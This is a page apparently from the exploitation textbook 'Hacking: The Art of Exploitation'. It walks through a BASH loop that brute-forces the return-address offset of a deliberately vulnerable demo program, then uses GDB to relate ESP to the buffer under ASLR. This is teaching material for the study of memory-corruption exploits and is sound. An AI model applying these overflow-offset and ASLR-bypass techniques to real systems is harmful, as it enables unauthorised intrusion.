<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x6c1 Investigations with BASH and GDB</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part157.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part159.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark145">0x6c1 Investigations with BASH and GDB</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Since ASLR doesn’t stop the memory corruption, we can still use a brute- forcing BASH script to figure out the offset to the return address from the</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">beginning of the buffer. When a program exits, the value returned from the main function is the exit status. This status is stored in the BASH variable <span class="s31">$?</span>, which can be used to detect whether the program crashed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1180.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./aslr_demo test buffer is at 0xbfb80320 reader@hacking:~/booksrc $ echo $?</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./aslr_demo $(perl -e &#39;print &quot;AAAA&quot;x50&#39;) buffer is at 0xbfbe2ac0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Segmentation fault reader@hacking:~/booksrc $ echo $? 139</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1181.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Using BASH’s <span class="s31">if </span>statement logic, we can stop our brute-forcing script when it crashes the target. The <span class="s31">if </span>statement block is contained between the keywords <span class="s31">then </span>and <span class="s31">fi</span>; the whitespace in the <span class="s31">if </span>statement is required. The <span class="s31">break </span>statement tells the script to break out of the <span class="s31">for </span>loop.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1182.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ for i in $(seq 1 50)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; do</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; echo &quot;Trying offset of $i words&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; ./aslr_demo $(perl -e &quot;print &#39;AAAA&#39;x$i&quot;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; if [ $? != 1 ]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; then</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; echo &quot;==&gt; Correct offset to return address is $i words&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; break</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; fi</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">&gt; done</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Trying offset of 1 words buffer is at 0xbfc093b0 Trying offset of 2 words buffer is at 0xbfd01ca0 Trying offset of 3 words buffer is at 0xbfe45de0 Trying offset of 4 words buffer is at 0xbfdcd560 Trying offset of 5 words buffer is at 0xbfbf5380 Trying offset of 6 words buffer is at 0xbffce760 Trying offset of 7 words buffer is at 0xbfaf7a80 Trying offset of 8 words buffer is at 0xbfa4e9d0 Trying offset of 9 words buffer is at 0xbfacca50 Trying offset of 10 words buffer is at 0xbfd08c80 Trying offset of 11 words buffer is at 0xbff24ea0 Trying offset of 12 words buffer is at 0xbfaf9a70</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">Trying offset of 13 words buffer is at 0xbfe0fd80 Trying offset of 14 words buffer is at 0xbfe03d70 Trying offset of 15 words buffer is at 0xbfc2fb90 Trying offset of 16 words buffer is at 0xbff32a40 Trying offset of 17 words buffer is at 0xbf9da940 Trying offset of 18 words buffer is at 0xbfd0cc70 Trying offset of 19 words buffer is at 0xbf897ff0 Illegal instruction</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">==&gt; Correct offset to return address is 19 words reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1183.png"/></span></p><p style="padding-top: 6pt;padding-left: 109pt;text-indent: 0pt;text-align: justify;">Knowing the proper offset will let us overwrite the return address.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">However, we still cannot execute shellcode since its location is randomized. Using GDB, let’s look at the program just as it’s about to return from the main function.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1184.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q ./aslr_demo</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. (gdb) disass main</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Dump of assembler code for function main: 0x080483b4 &lt;main+0&gt;:  push  ebp 0x080483b5 &lt;main+1&gt;:  mov  ebp,esp 0x080483b7 &lt;main+3&gt;:  sub  esp,0x58</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080483ba &lt;main+6&gt;:  and  esp,0xfffffff0 0x080483bd &lt;main+9&gt;:  mov  eax,0x0 0x080483c2 &lt;main+14&gt;:  sub  esp,eax 0x080483c4 &lt;main+16&gt;:  lea  eax,[ebp-72]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080483c7 &lt;main+19&gt;:  mov  DWORD PTR [esp+4],eax 0x080483cb &lt;main+23&gt;:  mov  DWORD PTR [esp],0x80484d4 0x080483d2 &lt;main+30&gt;:  call  0x80482d4 &lt;printf@plt&gt; 0x080483d7 &lt;main+35&gt;:  cmp  DWORD PTR [ebp+8],0x1 0x080483db &lt;main+39&gt;:  jle  0x80483f4 &lt;main+64&gt; 0x080483dd &lt;main+41&gt;:  mov  eax,DWORD PTR [ebp+12] 0x080483e0 &lt;main+44&gt;:  add  eax,0x4</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080483e3 &lt;main+47&gt;:  mov  eax,DWORD PTR [eax] 0x080483e5 &lt;main+49&gt;:  mov  DWORD PTR [esp+4],eax 0x080483e9 &lt;main+53&gt;:  lea  eax,[ebp-72] 0x080483ec &lt;main+56&gt;:  mov  DWORD PTR [esp],eax 0x080483ef &lt;main+59&gt;:  call  0x80482c4 &lt;strcpy@plt&gt; 0x080483f4 &lt;main+64&gt;:  mov  eax,0x1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0x080483f9 &lt;main+69&gt;:  leave 0x080483fa &lt;main+70&gt;:  ret End of assembler dump.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) break *0x080483fa</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1 at 0x80483fa: file aslr_demo.c, line 12. (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1185.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The breakpoint is set at the last instruction of <span class="s31">main</span>. This instruction returns EIP to the return address stored on the stack. When an exploit overwrites the return address, this is the last instruction where the original program has control. Let’s take a look at the registers at this point in the code for a couple of different trial runs.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1186.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/aslr_demo</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">buffer is at 0xbfa131<span class="s31">a0</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">12   }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) info registers</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">eax      0x1   1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ecx      0x0   0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">edx      0xb7f000b0   -1209007952</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ebx      0xb7efeff4    -1209012236</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">esp      0xbfa131<span class="s31">ec    0xbfa131ec</span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ebp      0xbfa13248    0xbfa13248</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">esi     0xb7f29ce0   -1208836896</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">edi      0x0   0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">eip      0x80483fa    0x80483fa &lt;main+70&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">eflags    0x200246 [ PF ZF IF ID ]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">cs       0x73   115</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ss       0x7b   123</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ds       0x7b   123</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">es       0x7b   123</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fs       0x0   0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">gs       0x33   51</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The program being debugged has been started already. Start it from the beginning? (y or n) y</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/aslr_demo</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">buffer is at 0xbfd8e5<span class="s31">20</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">12   }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) i r esp</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">esp      0xbfd8e5<span class="s31">6c    0xbfd8e56c (gdb) run</span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">The program being debugged has been started already. Start it from the beginning? (y or n) y</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/aslr_demo</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">buffer is at 0xbfaada<span class="s31">40</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">12   }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) i r esp</p><p class="s46" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">esp      0xbfaada<span class="s31">8c    0xbfaada8c (gdb)</span></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1187.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Despite the randomization between runs, notice how similar the address in ESP is to the address of the buffer (shown in bold). This makes sense, since the stack pointer points to the stack and the buffer is on the stack. ESP’s value and the buffer’s address are changed by the same random value, because they are relative to each other.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">GDB’s <span class="s31">stepi </span>command steps the program forward in execution by a single instruction. Using this, we can check ESP’s value after the <span class="s31">ret </span>instruction has executed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1188.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) run</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">The program being debugged has been started already. Start it from the beginning? (y or n) y</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Starting program: /home/reader/booksrc/aslr_demo buffer is at 0xbfd1ccb0</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">12   }</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) i r esp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">esp       0xbfd1ccfc    0xbfd1ccfc (gdb) stepi</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">0xb7e4debc in <u>&nbsp;</u>libc_start_main () from /lib/tls/i686/cmov/libc.so.6 (gdb) i r esp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">esp      0xbfd1cd00    0xbfd1cd00 (gdb) x/24x 0xbfd1ccb0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: justify;">0xbfd1ccb0:   0x00000000    0x080495cc    0xbfd1ccc8    0x08048291 0xbfd1ccc0:   0xb7f3d729    0xb7f74ff4    0xbfd1ccf8    0x08048429 0xbfd1ccd0:   0xb7f74ff4    0xbfd1cd8c    0xbfd1ccf8    0xb7f74ff4 0xbfd1cce0:   0xb7f937b0    0x08048410    0x00000000    0xb7f74ff4 0xbfd1ccf0:   0xb7f9fce0    0x08048410    0xbfd1cd58    0xb7e4debc <b>0xbfd1cd00:   0x00000001    </b>0xbfd1cd84    0xbfd1cd8c    0xb7fa0898 (gdb) p 0xbfd1cd00 - 0xbfd1ccb0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 80</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 80/4</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$2 = 20</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1189.png"/></span></p><p style="padding-top: 7pt;padding-left: 109pt;text-indent: 0pt;text-align: justify;">Single stepping shows that the <span class="s31">ret </span>instruction increases the value of ESP by</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">4. Subtracting the value of ESP from the address of the buffer, we find that ESP is pointing 80 bytes (or 20 words) from the start of the buffer. Since the return address’s offset was 19 words, this means that after <span class="s31">main</span>’s final <span class="s31">ret </span>instruction, ESP points to stack memory found directly after the return address. This would be useful if there was a way to control EIP to go where ESP is pointing instead.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part157.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part159.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
